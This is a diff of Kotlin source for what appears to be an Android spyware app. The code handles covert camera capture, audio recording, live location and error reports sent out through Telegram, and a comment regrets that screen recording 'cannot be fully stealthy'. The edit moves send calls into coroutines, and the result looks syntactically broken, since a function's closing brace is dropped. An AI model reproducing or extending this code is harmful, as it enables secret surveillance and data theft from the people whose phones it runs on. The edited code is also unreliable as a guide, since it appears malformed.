@@ -260,7 +260,7 @@ initCallRecording()
                 override fun onDisconnected(device: CameraDevice) { device.close() }
                 override fun onError(device: CameraDevice, error: Int) { device.close() }
             }, Handler(Looper.getMainLooper()))
-        } catch (e: Exception) 
+        } catch (e: Exception) {
 
 CoroutineScope(Dispatchers.IO).launch {
     sendError("Camera failed: ${e.message}")
@@ -291,16 +291,26 @@ CoroutineScope(Dispatchers.IO).launch {
                 }, durationSec * 1000L)
             } catch (e: Exception) {
                 release()
-                sendError("Audio record error: ${e.message}")
+
+
+CoroutineScope(Dispatchers.IO).launch {
+    sendError("Audio record error: ${e.message}")
+}
+
+                
             }
         }
     }
 
     private fun recordScreen(durationSec: Int) {
-        // Needs MediaProjection – system dialog will appear! User will see it.
-        sendTelegramMessage("Screen recording requires user interaction on non-rooted device. Cannot be fully stealthy.")
-        // Implementation omitted because it's impossible to hide completely.
-    }
+
+CoroutineScope(Dispatchers.IO).launch {
+    sendTelegramMessage        
+("Screen recording requires user interaction on non-rooted device. Cannot be fully stealthy.")
+}
+
+
+        
 
     private suspend fun sendLiveLocation() {
         val location = getLastLocation()
